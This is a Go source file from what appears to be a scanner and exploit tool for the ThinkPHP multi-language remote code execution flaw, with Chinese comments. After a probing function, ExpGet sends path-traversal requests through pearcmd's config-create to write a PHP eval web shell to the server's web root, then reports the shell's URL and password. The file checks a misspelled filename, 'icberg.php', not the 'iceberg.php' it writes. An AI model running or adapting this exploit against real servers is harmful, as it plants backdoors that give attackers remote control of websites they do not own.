package Common

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

// 异常捕获
func Error(Url string) {
	err := recover()
	if err != nil {
		log.Printf("[-] %v 扫描异常!\n", Url)
		//log.Fatal(err)
	}
}

var ResultUrl []string
var ExpUrl []string

func RequestGET(Url string) string {
	defer Error(Url)
	client := &http.Client{
		// 设置请求时间
		Timeout: (5 * time.Second),
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, _ := http.NewRequest("GET", Url, nil)
	request.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}
	response, err := client.Do(request)
	if err != nil {
		return ""
	}
	defer response.Body.Close()
	return string(response.StatusCode)
}

func RequestGET1(Url string) string {
	defer Error(Url)
	client := &http.Client{
		// 设置请求时间
		Timeout: (5 * time.Second),
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, _ := http.NewRequest("GET", Url, nil)
	request.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}
	response, err := client.Do(request)
	if err != nil {
		return ""
	}
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	return string(body)
}

func RequestGetBody(Url string) string {
	defer Error(Url)
	client := &http.Client{
		// 设置请求时间
		Timeout: (5 * time.Second),
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, _ := http.NewRequest("GET", Url, nil)
	request.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}
	response, err := client.Do(request)
	if err != nil {
		log.Fatal(err)
	}
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	return string(body)
}

func RequestPOST(Url string, body string) string {
	defer Error(Url)
	client := &http.Client{
		Timeout: (5 * time.Second),
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	request, _ := http.NewRequest("POST", Url, strings.NewReader(body))
	request.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}
	response, err := client.Do(request)
	if err != nil {
		return ""
	}
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)

	return string(content)
}

// 自定义get请求(thinkphp_lang)
func CustomizeGET(Url string) string {
	defer Error(Url)
	client := &http.Client{
		Timeout: (5 * time.Second),
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	request, _ := http.NewRequest("GET", Url+"/index.php?lang=iceberg_N", nil)
	request.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}
	response, err := client.Do(request)
	if err != nil {
		return ""
	}
	defer response.Body.Close()
	poc := response.Header["Set-Cookie"][0]

	if strings.Contains(poc, "iceberg_n") {
		//uri, _ := url.Parse("http://127.0.0.1:8080")
		client := http.Client{
			//Transport: &http.Transport{
			//	// 设置代理
			//	Proxy: http.ProxyURL(uri),
			//},
			Timeout: 5 * time.Second,
			// 禁止重定向
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		request1, _ := http.NewRequest("GET", Url+"/index.php?lang=../../../../../public/index.php", nil)
		request1.Header = http.Header{
			"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
			"Content-Type": {"application/x-www-form-urlencoded"},
		}
		response1, _ := client.Do(request1)
		defer response1.Body.Close()
		if response1.StatusCode == 200 {
			//fmt.Printf("thinkphp_lang\n")
			result := "[+]" + Url + "存在thinkphp多语言rce漏洞!\n"
			fmt.Printf(result)
			ResultUrl = append(ResultUrl, result)

		}
		//else {
		//	fmt.Printf("[-] %v不存在thinkphp多语言rce漏洞!\n", Url)
		//}

	}
	return ""
}

func ExpGet(Url string) string {
	defer Error(Url)
	client := &http.Client{
		Timeout: 5 * time.Second,
		// 禁止重定向
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	requestOne, _ := http.NewRequest("GET", Url+"/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['iceberg_N']);echo md5('iceberg_N');?>+/var/www/html/iceberg.php", nil)
	requestOne.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
		"think-lang":   {"../../../../../../../../usr/local/lib/php/pearcmd"},
		"Cookie":       {"think_lang=../../../../../../../../usr/local/lib/php/pearcmd"},
	}
	responseOne, err := client.Do(requestOne)
	if err != nil {
		return ""
	}
	defer responseOne.Body.Close()
	requestTwo, _ := http.NewRequest("GET", Url+"/index.php?+config-create+/<?=@eval($_REQUEST['iceberg_N']);echo md5('iceberg_N');?>+/var/www/html/iceberg.php", nil)
	requestTwo.Header = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400"},
		"Content-Type": {"application/x-www-form-urlencoded"},
		"think-lang":   {"../../../../../../../../usr/local/lib/php/pearcmd"},
		"Cookie":       {"think_lang=../../../../../../../../usr/local/lib/php/pearcmd"},
	}
	responseTwo, err := client.Do(requestTwo)
	if err != nil {
		return ""
	}
	defer responseTwo.Body.Close()

	if strings.Contains(RequestGetBody(Url+"/icberg.php"), "877869cbfed11fc453c218174121cc7c") {
		result := "[+] " + Url + "webshell上传成功!\nurl:" + Url + "/icberg.php\n密码:iceberg_N"
		fmt.Printf(result)
		ExpUrl = append(ExpUrl, result)

	}
	return ""
}
